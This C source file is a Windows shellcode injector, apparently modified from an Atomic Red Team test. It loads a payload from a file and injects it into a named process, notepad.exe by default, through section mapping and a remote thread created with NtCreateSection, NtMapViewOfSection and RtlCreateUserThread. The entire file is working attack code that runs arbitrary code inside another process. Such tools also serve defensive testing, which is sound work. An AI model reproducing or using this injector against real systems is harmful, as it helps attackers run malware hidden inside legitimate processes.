/*
    Modified InjectView - Load shellcode from file
    Based on: Atomic Red Team InjectView by traceflow@0x8d.cc
    Modified to load shellcode from external file
*/

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Typedefs from original InjectView.c
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI * NtCreateSection_t)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG PageAttributess,
    IN ULONG SectionAttributes,
    IN HANDLE FileHandle OPTIONAL);

typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID * BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS (NTAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits OPTIONAL,
	IN OUT PULONG StackReserved OPTIONAL,
	IN OUT PULONG StackCommit OPTIONAL,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle OPTIONAL,
	OUT PCLIENT_ID ClientId OPTIONAL);

// Load shellcode from file
unsigned char* LoadShellcodeFromFile(const char* filename, unsigned int* out_size) {
    HANDLE hFile;
    DWORD fileSize;
    DWORD bytesRead;
    unsigned char* buffer = NULL;

    printf("[*] Loading shellcode from: %s\n", filename);

    hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error opening file: %s (Error: %lu)\n", filename, GetLastError());
        return NULL;
    }

    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[-] Error getting file size (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    printf("[+] File size: %lu bytes (%.2f KB)\n", fileSize, fileSize / 1024.0);

    buffer = (unsigned char*)malloc(fileSize);
    if (buffer == NULL) {
        printf("[-] Memory allocation failed\n");
        CloseHandle(hFile);
        return NULL;
    }

    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        printf("[-] Error reading file (Error: %lu)\n", GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }

    if (bytesRead != fileSize) {
        printf("[-] Incomplete read: %lu / %lu bytes\n", bytesRead, fileSize);
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    *out_size = fileSize;
    printf("[+] Shellcode loaded successfully\n");
    return buffer;
}

int FindProcess(const char *procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    while (Process32Next(hSnapshot, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hSnapshot);
    return pid;
}

int Inject(HANDLE hProc, unsigned char *shellcode, unsigned int shellcode_len) {
    HANDLE hSection = NULL;
    PVOID pLocalSectionView = NULL;
    PVOID pRemoteSectionView = NULL;
    HANDLE hThread = NULL;
    LARGE_INTEGER sectionSize;
    SIZE_T viewSize;
    NTSTATUS status;

    printf("[*] Starting injection process...\n");

    // Get pointers to the functions we need from ntdll.dll
    NtCreateSection_t NtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
    if(NtCreateSection == NULL) {
        printf("[-] Failed to resolve NtCreateSection\n");
        return -1;
    }

    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
    if(NtMapViewOfSection == NULL) {
        printf("[-] Failed to resolve NtMapViewOfSection\n");
        return -1;
    }

    RtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
    if(RtlCreateUserThread == NULL) {
        printf("[-] Failed to resolve RtlCreateUserThread\n");
        return -1;
    }

    printf("[+] NT APIs resolved\n");

    // Prepare section size properly (must be LARGE_INTEGER)
    sectionSize.QuadPart = shellcode_len;
    viewSize = shellcode_len;

    // Create section object
    printf("[*] Creating section object (size: %u bytes)...\n", shellcode_len);
    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0) {
        printf("[-] NtCreateSection failed (NTSTATUS: 0x%08X)\n", status);
        return -1;
    }
    printf("[+] Section created\n");

    // Create local section view
    printf("[*] Mapping local section view...\n");
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalSectionView, NULL, NULL, NULL, &viewSize, ViewUnmap, NULL, PAGE_READWRITE);
    if (status != 0) {
        printf("[-] NtMapViewOfSection (local) failed (NTSTATUS: 0x%08X)\n", status);
        return -1;
    }
    printf("[+] Local view mapped at: 0x%p\n", pLocalSectionView);

    // Copy payload to section
    printf("[*] Copying shellcode to section...\n");
    memcpy(pLocalSectionView, shellcode, shellcode_len);
    printf("[+] Shellcode copied\n");

    // Create remote section view in target process
    viewSize = shellcode_len;  // Reset for remote mapping
    printf("[*] Mapping remote section view...\n");
    status = NtMapViewOfSection(hSection, hProc, &pRemoteSectionView, NULL, NULL, NULL, &viewSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);
    if (status != 0) {
        printf("[-] NtMapViewOfSection (remote) failed (NTSTATUS: 0x%08X)\n", status);
        return -1;
    }
    printf("[+] Remote view mapped at: 0x%p\n", pRemoteSectionView);

    // Execute shellcode in remote process
    printf("[*] Creating remote thread...\n");
    status = RtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteSectionView, 0, &hThread, NULL);
    if(hThread != NULL) {
        printf("[+] Thread created successfully (Handle: 0x%p)\n", hThread);
        printf("[*] Waiting for thread execution...\n");
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        printf("[+] Injection completed\n");
        return 0;
    } else {
        printf("[-] RtlCreateUserThread failed\n");
        return -1;
    }
}

int main(int argc, char *argv[]) {
    DWORD pid = 0;
    HANDLE hProc = NULL;
    unsigned char* shellcode = NULL;
    unsigned int shellcode_len = 0;
    const char* shellcode_file = "payload.bin";
    const char* target_process = "notepad.exe";

    printf("=== Section View Injection - File Loader ===\n\n");

    // Parse command line arguments
    if (argc >= 2) {
        shellcode_file = argv[1];
    }
    if (argc >= 3) {
        target_process = argv[2];
    }

    printf("[*] Configuration:\n");
    printf("    Shellcode file: %s\n", shellcode_file);
    printf("    Target process: %s\n\n", target_process);

    // Load shellcode from file
    shellcode = LoadShellcodeFromFile(shellcode_file, &shellcode_len);
    if (shellcode == NULL) {
        return 1;
    }

    // Find target process
    printf("\n[*] Looking for target process: %s\n", target_process);
    pid = FindProcess(target_process);

    if(pid) {
        printf("[+] Found process (PID: %lu)\n", pid);

        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);

        if(hProc != NULL) {
            printf("[+] Process opened successfully\n\n");
            Inject(hProc, shellcode, shellcode_len);
            CloseHandle(hProc);
        } else {
            printf("[-] Error opening process (Error: %lu)\n", GetLastError());
        }
    } else {
        printf("[-] %s not running. Start the target process first.\n", target_process);
    }

    // Cleanup
    if (shellcode != NULL) {
        free(shellcode);
    }

    return 0;
}

